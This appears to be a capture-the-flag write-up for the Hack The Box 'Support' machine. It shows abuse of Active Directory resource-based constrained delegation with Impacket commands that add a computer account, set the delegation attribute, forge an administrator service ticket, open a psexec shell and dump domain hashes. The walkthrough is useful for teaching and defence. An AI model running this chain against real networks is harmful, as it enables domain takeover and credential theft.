------------

### AD attacks-:

------------

### Abuse Resource-Based Constrained Delegation to Gain Unauthorized Access

--------------

- In Resource-Based Constrained Delegation (RBCD), we configure the target resource e.g. a database or file server to specify which service accounts are permitted to access it on behalf of users. For example, a database service can be set up to allow specific services, like a web service, to act on behalf of users through assigned security permissions.
- This differs from unconstrained and constrained delegation. With unconstrained delegation, service accounts with delegation enabled can access any resource on behalf of users. Similarly, with constrained delegation, service accounts with delegation enabled can access a specific list of resources.
- Requirement-:

```
BCD is configured by setting the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.
This attribute specifies which service accounts or systems are permitted to act on behalf of users to access the target resource.
-To exploit this type of delegation, an attacker must gain access to an account with Write permissions on the targeted resource (computer object), such as GenericAll, GenericWrite, and WriteDACL.
```

- User `SUPPORT@SUPPORT.HTB` which the user I owned before is a member of a group called `SHARED SUPPORT ACCOUNTS@SUPPORT.HTB`. The group itself have full control to a computer called DC.SUPPORT.HTB, so in other words user SUPPORT have full control to DC.SUPPORT.HTB including write permission.
  
![image](https://github.com/user-attachments/assets/4b44f38a-49c4-45fb-b68f-ddf8a3f1442b)

- Exploiting with rbcd tool
- Impacket tool `[AddCOmputer]`Syntax to add a computer-:

```bash
addcomputer.py -computer-name 'password' -computer-pass 'password' -dc-ip [ip] '[domain]/[username]:[password]'
```

![image](https://github.com/user-attachments/assets/bc19a1ba-5325-444a-9a0d-803f1128bcf9)

- Then, we use the RBCD python script to add our new computer to the msds-allowedtoactonbehalfofotheridentity attribute list.[RBCD tool](https://github.com/AlteredSecurity/RBCD.git)

![image](https://github.com/user-attachments/assets/e916c933-d028-4a30-9580-1de27fdd9790)

- Syntax-:

```
python3 rbcd.py 10.10.11.174 -u [domain]\\[user] -p '[password]' -t DC -f [newly created computer]
```
![image](https://github.com/user-attachments/assets/4d39f81b-92fa-4ae4-9e0a-f6b6ab2757d9)

- Now, we have what it needs to request a service ticket; we will use the getST.py script from impacket instead of Rubeus to request the service ticket as administrator.

```bash
python3 getST.py -spn cifs/[object with unconstrained delegation over] -impersonate [user] -dc-ip [ip] '[domain]/[user]:[password]'
```

![image](https://github.com/user-attachments/assets/253b6ac4-0518-46c5-afc0-bdf8f9d90c10)

![image](https://github.com/user-attachments/assets/a4cb3279-56f8-4360-b567-7a5336a1a96c)

- When the ticket is issued, we can use by setting it to variable `KRB5CCNAME` for `impacket-psexec`.

Syntax-:

```bash
KRB5CCNAME=[ccache file name [endswith .ccache] impacket-psexec [domain]/[user]@[object] -k -no-pass
```

![image](https://github.com/user-attachments/assets/68bf410e-228d-4ade-9698-4afec915d1fb)

- Dumping the hashes with impacket-secretsdump-:
 - You can set the `KRB5CCNAME` as an environmental variable
   ```bash
   export KRB5CCNAME=$(pwd)/administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
   ```
  
- Syntax-:

```bash
impacket-secretsdump -k -target-ip [ip] [domain name]
```
![image](https://github.com/user-attachments/assets/bed765e7-218d-4e65-9afc-e0f156620534)

- Pass the hash with Evil-winrm -:

![image](https://github.com/user-attachments/assets/0f8af80b-c32a-4782-a63d-0f76e1e93cf7)

------------------------

### Reference

-----------------------

- [Unconstrained Resource Delegation](https://medium.com/r3d-buck3t/how-to-abuse-resource-based-constrained-delegation-to-gain-unauthorized-access-36ac8337dd5a)






